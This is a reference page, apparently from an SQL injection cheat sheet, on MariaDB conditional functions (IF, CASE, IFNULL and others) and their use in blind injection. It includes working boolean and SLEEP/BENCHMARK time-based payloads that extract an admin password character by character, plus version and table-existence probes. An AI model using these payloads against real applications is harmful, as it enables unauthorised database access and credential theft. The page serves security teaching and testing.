---
title: Conditional Statements
description: Using conditional logic in MariaDB injections
category: Injection Techniques
order: 12
tags: ["conditional logic", "if", "case", "boolean"]
lastUpdated: 2025-12-18
---

## Conditional Statements

Conditional statements are crucial for blind SQL injection techniques, allowing attackers to extract information one bit at a time by analyzing the application's response to different conditions.

## IF() Function

The `IF()` function evaluates a condition and returns one value if true, another if false.

```sql
IF(condition, value_if_true, value_if_false)
```

### Basic Usage

```sql
SELECT IF(1=1, 'True', 'False')
-- Returns: 'True'

SELECT IF(1=2, 'True', 'False')
-- Returns: 'False'

-- With numeric return values
SELECT IF(1=1, 100, 0)
-- Returns: 100
```

### NULL Condition

NULL is treated as false:

```sql
SELECT IF(NULL, 'True', 'False')
-- Returns: 'False'
```

### With Column Values and Subqueries

```sql
-- Column comparison
SELECT IF(username='admin', 'is admin', 'not admin') FROM users WHERE id = 1

-- Subquery in condition
SELECT IF((SELECT COUNT(*) FROM users) > 0, 'has users', 'no users')
```

### Nested IF()

```sql
SELECT IF(1=1, IF(2=2, 'both true', 'first only'), 'none')
-- Returns: 'both true'
```

## CASE Statement

The `CASE` statement provides more flexible conditional logic with multiple conditions.

### Searched CASE (WHEN conditions)

```sql
SELECT CASE
  WHEN 1=1 THEN 'First is true'
  WHEN 2=2 THEN 'Second is true'
  ELSE 'Nothing is true'
END
-- Returns: 'First is true' (first match wins)

-- Second condition matches
SELECT CASE
  WHEN 1=2 THEN 'First is true'
  WHEN 2=2 THEN 'Second is true'
  ELSE 'Nothing is true'
END
-- Returns: 'Second is true'

-- ELSE clause
SELECT CASE
  WHEN 1=2 THEN 'First'
  WHEN 2=3 THEN 'Second'
  ELSE 'Nothing is true'
END
-- Returns: 'Nothing is true'
```

### Simple CASE (value matching)

```sql
SELECT CASE 1
  WHEN 1 THEN 'one'
  WHEN 2 THEN 'two'
  ELSE 'other'
END
-- Returns: 'one'
```

### With Column Values

```sql
SELECT username, CASE
  WHEN username = 'admin' THEN 'administrator'
  WHEN username = 'guest' THEN 'guest user'
  ELSE 'regular user'
END AS role
FROM users WHERE id = 1
```

### Without ELSE (returns NULL)

```sql
SELECT CASE WHEN 1=2 THEN 'true' END
-- Returns: NULL
```

## IFNULL() and NULLIF() Functions

### IFNULL()

Returns first argument if not NULL, otherwise second:

```sql
SELECT IFNULL('value', 'default')
-- Returns: 'value'

SELECT IFNULL(NULL, 'Value is NULL')
-- Returns: 'Value is NULL'

-- With numeric values
SELECT IFNULL(NULL, 0)
-- Returns: 0

-- With column values
SELECT IFNULL(email, 'no email') FROM users WHERE id = 1
```

### NULLIF()

Returns NULL if arguments are equal, otherwise first argument:

```sql
SELECT NULLIF('a', 'b')
-- Returns: 'a'

SELECT NULLIF('a', 'a')
-- Returns: NULL

SELECT NULLIF(5, 5)
-- Returns: NULL
```

### Avoid Division by Zero

```sql
SELECT 10 / NULLIF(0, 0)
-- Returns: NULL (instead of error)
```

### Combining IFNULL and NULLIF

```sql
-- Treat empty string as NULL
SELECT IFNULL(NULLIF('', ''), 'empty')
-- Returns: 'empty'
```

## Additional Conditional Functions

### COALESCE

Returns first non-NULL value:

```sql
SELECT COALESCE(NULL, NULL, 'third', 'fourth')
-- Returns: 'third'

SELECT COALESCE(NULL, NULL, NULL)
-- Returns: NULL
```

### ELT and FIELD

```sql
-- ELT returns Nth element
SELECT ELT(2, 'a', 'b', 'c')
-- Returns: 'b'

-- FIELD returns position of first argument
SELECT FIELD('b', 'a', 'b', 'c')
-- Returns: 2
```

### GREATEST and LEAST

```sql
SELECT GREATEST(1, 5, 3)
-- Returns: 5

SELECT LEAST(1, 5, 3)
-- Returns: 1
```

### INTERVAL

Returns index of first value greater than first argument:

```sql
SELECT INTERVAL(23, 1, 15, 17, 30, 44)
-- Returns: 3 (23 > 17 but < 30)
```

## Using Conditional Logic in SQL Injection

### Character Extraction

```sql
-- Test first character of password
SELECT IF(
  SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a',
  1, 0
)

-- Using ASCII for numeric comparison
SELECT IF(
  ASCII(SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1)) = 97,
  'a', 'not a'
)
-- 97 = ASCII value of 'a'
```

### Length Detection

```sql
SELECT IF(
  LENGTH((SELECT username FROM users WHERE id = 1)) = 5,
  'length is 5', 'different length'
)
```

### Binary Search Pattern

```sql
-- Check if ASCII value > 100
SELECT IF(
  ASCII(SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1)) > 100,
  'above 100', 'below or equal 100'
)
```

### Boolean-based AND Pattern

```sql
-- True condition returns row
SELECT * FROM users WHERE id = 1 AND IF(1=1, 1, 0)
-- Returns the user

-- False condition returns no rows
SELECT * FROM users WHERE id = 1 AND IF(1=2, 1, 0)
-- Returns nothing
```

### CASE in WHERE Clause

```sql
SELECT * FROM users WHERE id = 1 AND (
  SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END FROM users WHERE id = 1
)
```

## Time-based Blind Injection

### IF with SLEEP

```sql
-- Sleep when condition is true
SELECT IF(1=1, SLEEP(5), 0)
-- Sleeps for 5 seconds

-- No sleep when condition is false
SELECT IF(1=2, SLEEP(5), 0)
-- Returns immediately
```

### Data Extraction with SLEEP

```sql
-- Sleep if first character matches
SELECT IF(
  SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1) = 'a',
  SLEEP(5), 0
)
```

### CASE with SLEEP

```sql
SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END
```

### In Injection Context

```sql
-- Sleep for 5 seconds if admin's password starts with 'a'
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) -- -
```

## Version Detection with Conditionals

### Using MID() and version()

```sql
-- Check if MariaDB 10.x
SELECT IF(MID(version(),1,2)='10', 'MariaDB 10.x', 'other')

-- Check if MariaDB 11.x
SELECT IF(MID(version(),1,2)='11', 'MariaDB 11.x', 'other')

-- Using LIKE for pattern matching
SELECT IF(MID(version(),1,1) LIKE '1', 'MariaDB 10.x or 11.x', 'other')
```

### Using SUBSTRING() and @@version

```sql
SELECT IF(SUBSTRING(@@version,1,2)='10', 'MariaDB 10.x', 'other')
```

### Multiple Version Checks with CASE

```sql
SELECT CASE
  WHEN MID(version(),1,2) = '11' THEN 'MariaDB 11.x'
  WHEN MID(version(),1,2) = '10' THEN 'MariaDB 10.x'
  ELSE 'Other version'
END AS version_family
```

### BENCHMARK for Timing-based Detection

```sql
-- Delay if MariaDB 10.x or 11.x (version starts with '1')
SELECT IF(MID(version(),1,1)='1', BENCHMARK(100000,SHA1('test')), 0)

-- Alternative with MD5
SELECT IF(SUBSTRING(@@version,1,2) LIKE '1%', BENCHMARK(100000,MD5('x')), 0)
```

**Performance warning:** The "5M+ iterations" threshold is a rough rule-of-thumb for when heavy CPU load and slow-query issues are commonly observed on typical servers. However, thresholds vary significantly by environment (CPU speed, server load, MariaDB configuration).

**Recommended approach:**

1. Start testing at 10,000-100,000 iterations
2. Monitor CPU usage, query latency, and slow query logs
3. Gradually increase iterations while watching server metrics
4. Escalate caution well before reaching 5M if metrics degrade
5. Be aware that even lower values may trigger alerts on monitored production systems

## Boolean-based Injection Patterns

### Basic Pattern

```sql
-- Original vulnerable query:
SELECT * FROM articles WHERE id = [USER INPUT];

-- Injection payload:
1 AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END FROM users LIMIT 1)
```

### Chained Boolean Conditions

```sql
SELECT * FROM users WHERE id = 1
AND IF((SELECT COUNT(*) FROM users) > 0, 1, 0)
AND IF(LENGTH(DATABASE()) > 0, 1, 0)
```

### OR-based Injection

```sql
-- Returns all rows when condition is true
SELECT * FROM users WHERE id = 999
OR (SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END)
```

### Table Existence Check

```sql
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.TABLES
   WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users') > 0,
  'exists', 'not exists'
)
```

### Column Existence Check

```sql
SELECT IF(
  (SELECT COUNT(*) FROM information_schema.COLUMNS
   WHERE TABLE_SCHEMA = DATABASE()
   AND TABLE_NAME = 'users'
   AND COLUMN_NAME = 'password') > 0,
  'exists', 'not exists'
)
```

## Quick Reference

| Function     | Purpose             | Example                           |
| ------------ | ------------------- | --------------------------------- |
| `IF()`       | Ternary condition   | `IF(1=1, 'yes', 'no')`            |
| `CASE`       | Multiple conditions | `CASE WHEN x THEN y ELSE z END`   |
| `IFNULL()`   | Default for NULL    | `IFNULL(col, 'default')`          |
| `NULLIF()`   | NULL if equal       | `NULLIF(a, b)`                    |
| `COALESCE()` | First non-NULL      | `COALESCE(a, b, c)`               |
| `ELT()`      | Select nth element  | `ELT(2, 'a', 'b', 'c')` returns b |
| `FIELD()`    | Index position      | `FIELD('b', 'a', 'b', 'c')` → 2   |
| `GREATEST()` | Max of values       | `GREATEST(1, 5, 3)` → 5           |
| `LEAST()`    | Min of values       | `LEAST(1, 5, 3)` → 1              |
| `INTERVAL()` | Range index         | `INTERVAL(5, 1, 3, 7)` → 2        |

Conditional logic forms the foundation of sophisticated blind SQL injection techniques, allowing attackers to systematically extract data even when they can only observe whether a condition is true or false.
